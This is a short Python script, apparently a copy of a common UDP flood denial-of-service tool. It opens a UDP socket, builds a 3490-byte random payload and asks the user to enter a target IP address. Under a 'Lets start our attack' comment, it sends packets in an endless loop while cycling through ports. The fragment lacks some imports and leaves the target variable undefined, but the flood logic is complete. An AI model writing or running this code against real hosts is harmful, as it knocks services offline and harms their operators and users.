from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3490)

#Type your ip and port number (find IP address using nslookup or any online website) 
ip = (ip_address)
port = eval("80")

#Lets start our attack


time.sleep(5)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    if port == 65534:
        port = 1